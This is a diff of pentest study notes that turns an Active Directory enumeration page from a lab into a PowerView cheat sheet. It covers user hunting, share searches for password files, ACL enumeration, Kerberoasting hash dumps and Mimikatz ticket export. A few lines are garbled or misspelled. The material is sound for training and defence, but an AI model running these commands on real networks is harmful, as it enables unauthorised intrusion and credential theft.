@@ -1,102 +1,164 @@
-# Credentialed Enumeration - From Windows
+# Credentialed Enumeration - From Windows Using PowerView
+- Current Domain
 
+```bash
+#Get Current Domain: 
+Get-Domain
 
-**ActiveDirectory PowerShell Module**
+Enumerate Other Domains: 
+#Get-Domain -Domain <DomainName>
 
-[https://powersploit.readthedocs.io/en/latest/Recon/](https://powersploit.readthedocs.io/en/latest/Recon/)
+#Get Domain SID: 
+Get-DomainSIDGet Current Domain: Get-Domain
 
-### Powerview
-**Finding Users With SPN Set**
-    
-    ```
-    PS C:\htb> Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
-    
-    serviceprincipalname                          samaccountname
-    --------------------                          --------------
-    adfsconnect/azure01.inlanefreight.local       adfs
-    backupjob/veam001.inlanefreight.local         backupagent
-    d0wngrade/kerberoast.inlanefreight.local      d0wngrade
-    kadmin/changepw                               krbtgt
-    MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433 sqldev
-    MSSQLSvc/SPSJDB.inlanefreight.local:1433      sqlprod
-    MSSQLSvc/SQL-CL01-01inlanefreight.local:49351 sqlqa
-    sts/inlanefreight.local                       solarwindsmonitor
-    testspn/kerberoast.inlanefreight.local        testspn
-    testspn2/kerberoast.inlanefreight.local       testspn2
-    ```
-    
+#Enumerate Other Domains: 
+Get-Domain -Domain <DomainName>
 
-### **SharpView**
+Get Domain SID: 
+#Get-DomainSID
+```
 
-1. Finding Users With SPN Set
-    
-    ```
-    PS C:\htb> .\SharpView.exe Get-DomainUser -Help
-    
-    Get_DomainUser -Identity <String[]> -DistinguishedName <String[]> -SamAccountName <String[]> -Name <String[]> -MemberDistinguishedName <String[]> -MemberName <String[]> -SPN <Boolean> -AdminCount <Boolean> -AllowDelegation <Boolean> -DisallowDelegation <Boolean> -TrustedToAuth <Boolean> -PreauthNotRequired <Boolean> -KerberosPreauthNotRequired <Boolean> -NoPreauth <Boolean> -Domain <String> -LDAPFilter <String> -Filter <String> -Properties <String[]> -SearchBase <String> -ADSPath <String> -Server <String> -DomainController <String> -SearchScope <SearchScope> -ResultPageSize <Int32> -ServerTimeLimit <Nullable`1> -SecurityMasks <Nullable`1> -Tombstone <Boolean> -FindOne <Boolean> -ReturnOne <Boolean> -Credential <NetworkCredential> -Raw <Boolean> -UACFilter <UACEnum>
-    ```
-    
-2. Identify User With SPN Set
-    
-    ```powershell
-    PS C:\htb> .\SharpView.exe Get-DomainUser -Identity forend
-    
-    [Get-DomainSearcher] search base: LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL
-    [Get-DomainUser] filter string: (&(samAccountType=805306368)(|(samAccountName=forend)))
-    objectsid                      : {S-1-5-21-3842939050-3880317879-2865463114-5614}
-    samaccounttype                 : USER_OBJECT
-    objectguid                     : 53264142-082a-4cb8-8714-8158b4974f3b
-    useraccountcontrol             : NORMAL_ACCOUNT
-    accountexpires                 : 12/31/1600 4:00:00 PM
-    lastlogon                      : 4/18/2022 1:01:21 PM
-    lastlogontimestamp             : 4/9/2022 1:33:21 PM
-    pwdlastset                     : 2/28/2022 12:03:45 PM
-    lastlogoff                     : 12/31/1600 4:00:00 PM
-    badPasswordTime                : 4/5/2022 7:09:07 AM
-    name                           : forend
-    distinguishedname              : CN=forend,OU=IT Admins,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
-    whencreated                    : 2/28/2022 8:03:45 PM
-    whenchanged                    : 4/9/2022 8:33:21 PM
-    samaccountname                 : forend
-    memberof                       : {CN=VPN Users,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=Shared Calendar Read,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=Printer Access,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=File Share H Drive,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=File Share G Drive,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL}
-    cn                             : {forend}
-    objectclass                    : {top, person, organizationalPerson, user}
-    badpwdcount                    : 0
-    countrycode                    : 0
-    usnchanged                     : 3259288
-    logoncount                     : 26618
-    primarygroupid                 : 513
-    objectcategory                 : CN=Person,CN=Schema,CN=Configuration,DC=INLANEFREIGHT,DC=LOCAL
-    dscorepropagationdata          : {3/24/2022 3:58:07 PM, 3/24/2022 3:57:44 PM, 3/24/2022 3:52:58 PM, 3/24/2022 3:49:31 PM, 7/14/1601 10:36:49 PM}
-    usncreated                     : 3054181
-    instancetype                   : 4
-    codepage                       : 0
-    ```
-    
-    **PowerView Cheatsheet**
-    
-    ```bash
+- **Get Domain Policy:**
 
-    #Enumerasi Domain User Information
-    PS C:\htb> Get-DomainUser -Identity mmorgan -Domain inlanefreight.local | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol
-    
-    name                 : Matthew Morgan
-    samaccountname       : mmorgan
-    description          :
-    memberof             : {CN=VPN Users,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=Shared Calendar
-                           Read,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=Printer Access,OU=Security
-                           Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=File Share H Drive,OU=Security
-                           Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL...}
-    whencreated          : 10/27/2021 5:37:06 PM
-    pwdlastset           : 11/18/2021 10:02:57 AM
-    lastlogontimestamp   : 2/27/2022 6:34:25 PM
-    accountexpires       : NEVER
-    admincount           : 1
-    userprincipalname    : mmorgan@inlanefreight.local
-    serviceprincipalname :
-    mail                 :
-    useraccountcontrol   : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, DONT_REQ_PREAUTH
-    
-    ```
+```bash
+Get-DomainPolicy
 
-   detailed Powerview Function And Parameter Here : [All PowerView Cheatsheet](./PowerView.md)
+#Will show us the policy configurations of the Domain about system access or kerberos
+Get-DomainPolicy | Select-Object -ExpandProperty SystemAccess
+Get-DomainPolicy | Select-Object -ExpandProperty KerberosPolicy
+```
+
+- **Get Domain Controllers:**
+
+```bash
+Get-DomainController
+Get-DomainController -Domain <DomainName>
+```
+
+- **Enumerate Domain Users:**
+
+```bash
+#Save all Domain Users to a file
+Get-DomainUser | Out-File -FilePath .\DomainUsers.txt
+
+#Will return specific properties of a specific user
+Get-DomainUser -Identity [username] -Properties DisplayName, MemberOf | Format-List
+
+#Enumerate user logged on a machine
+Get-NetLoggedon -ComputerName <ComputerName>
+
+#Enumerate Session Information for a machine
+Get-NetSession -ComputerName <ComputerName>
+
+#Enumerate domain machines of the current/specified domain where specific users are logged into
+Find-DomainUserLocation -Domain <DomainName> | Select-Object UserName, SessionFromName
+```
+
+- **Enum Domain Computers:**
+
+```bash
+Get-DomainComputer -Properties OperatingSystem, Name, DnsHostName | Sort-Object -Property DnsHostName
+
+#Enumerate Live machines
+Get-DomainComputer -Ping -Properties OperatingSystem, Name, DnsHostName | Sort-Object -Property DnsHostName
+```
+
+- **Enum Groups and Group Members**
+
+```bash
+#Save all Domain Groups to a file:
+Get-DomainGroup | Out-File -FilePath .\DomainGroup.txt
+
+#Return members of Specific Group (eg. Domain Admins & Enterprise Admins)
+Get-DomainGroup -Identity '<GroupName>' | Select-Object -ExpandProperty Member
+Get-DomainGroupMember -Identity '<GroupName>' | Select-Object MemberDistinguishedName
+
+#Enumerate the local groups on the local (or remote) machine. Requires local admin rights on the remote machine
+Get-NetLocalGroup | Select-Object GroupName
+
+#Enumerates members of a specific local group on the local (or remote) machine. Also requires local admin rights on the remote machine
+Get-NetLocalGroupMember -GroupName Administrators | Select-Object MemberName, IsGroup, IsDomain
+
+#Return all GPOs in a domain that modify local group memberships through Restricted Groups or Group Policy Preferences
+Get-DomainGPOLocalGroup | Select-Object GPODisplayName, GroupName
+```
+
+- **Enum Domain Computers:**
+
+```bash
+Get-DomainComputer -Properties OperatingSystem, Name, DnsHostName | Sort-Object -Property DnsHostName
+
+#Enumerate Live machines
+Get-DomainComputer -Ping -Properties OperatingSystem, Name, DnsHostName | Sort-Object -Property DnsHostName
+```
+
+- **Enumerate Shares:**
+
+```bash
+#Enumerate Domain Shares
+Find-DomainShare
+
+#Enumerate Domain Shares the current user has access
+Find-DomainShare -CheckShareAccess
+
+#Enumerate "Interesting" Files on accessible shares
+Find-InterestingDomainShareFile -Include *passwords*
+```
+
+- **Enum Group Policies:**
+
+```bash
+Get-DomainGPO -Properties DisplayName | Sort-Object -Property DisplayName
+
+#Enumerate all GPOs to a specific computer
+Get-DomainGPO -ComputerIdentity <ComputerName> -Properties DisplayName | Sort-Object -Property DisplayName
+
+#Get users that are part of a Machine's local Admin group
+Get-DomainGPOComputerLocalGroupMapping -ComputerName <ComputerName>
+```
+
+- **Enum ACLs:**
+
+```bash
+# Returns the ACLs associated with the specified account
+Get-DomaiObjectAcl -Identity <AccountName> -ResolveGUIDs
+
+#Search for interesting ACEs
+Find-InterestingDomainAcl -ResolveGUIDs
+
+#Check the ACLs associated with a specified path (e.g smb share)
+Get-PathAcl -Path "\\Path\Of\A\Share"
+```
+
+- **User Hunting:**
+
+```bash
+#Finds all machines on the current domain where the current user has local admin access
+Find-LocalAdminAccess -Verbose
+
+#Find local admins on all machines of the domain
+Find-DomainLocalGroupMember -Verbose
+
+#Find computers were a Domain Admin OR a spesified user has a session
+Find-DomainUserLocation | Select-Object UserName, SessionFromName
+
+#Confirming admin access
+Test-AdminAccess
+```
+
+Kerberoasting
+
+```bash
+#Get User Accounts that are used as Service Accounts
+Get-NetUser -SPN
+
+#Get every available SPN account, request a TGS and dump its hash
+Invoke-Kerberoast
+
+#Requesting the TGS for a single account:
+Request-SPNTicket
+
+#Export all tickets using Mimikatz
+Invoke-Mimikatz -Command '"kerberos::list /export"'
+```
+
